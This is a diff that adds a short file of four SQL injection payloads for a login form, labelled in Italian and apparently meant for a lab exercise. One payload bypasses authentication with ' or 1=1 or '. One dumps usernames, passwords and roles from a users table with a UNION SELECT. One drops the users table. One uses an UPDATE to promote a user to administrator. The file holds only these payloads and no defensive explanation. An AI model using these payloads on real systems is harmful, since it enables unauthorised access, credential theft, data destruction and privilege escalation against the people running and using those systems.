@@ -1,0 +1,14 @@
+1.
+username: ' or 1=1 or '
+password: qualsiasi cosa
+
+2.
+username: ' UNION SELECT 1, username, password, ruolo FROM users -- '
+password: qualsiasi cosa
+
+3. 
+username: '; DROP TABLE users; -- 
+password: qualsiasi cosa
+
+4.
+username: '; UPDATE users SET ruolo='amministratore' WHERE username='user1'; --
